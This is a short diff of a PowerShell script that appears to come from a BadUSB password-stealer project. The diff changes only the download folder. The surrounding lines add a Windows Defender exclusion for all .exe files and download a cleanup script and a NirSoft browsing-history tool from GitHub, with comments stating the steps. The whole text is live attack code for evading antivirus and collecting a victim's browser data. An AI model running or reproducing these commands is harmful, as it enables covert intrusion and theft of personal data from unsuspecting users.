@@ -1,4 +1,4 @@
-Set-Location C:\Users\Public\Documents #Go to the folder in which we will donwload files
+Set-Location C:\temp #Go to the folder in which we will donwload files
 Add-MpPreference -ExclusionExtension exe -Force #Add exception for .exe files in antivirus
 Invoke-WebRequest https://raw.githubusercontent.com/tuconnaisyouknow/BadUSB_passStealer/main/other_files/fin.ps1 -OutFile fin.ps1 #Download final .ps1 file to delete all .txt files and stop all powershell process
 Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe #Download the nirsoft tool for Browserhistory
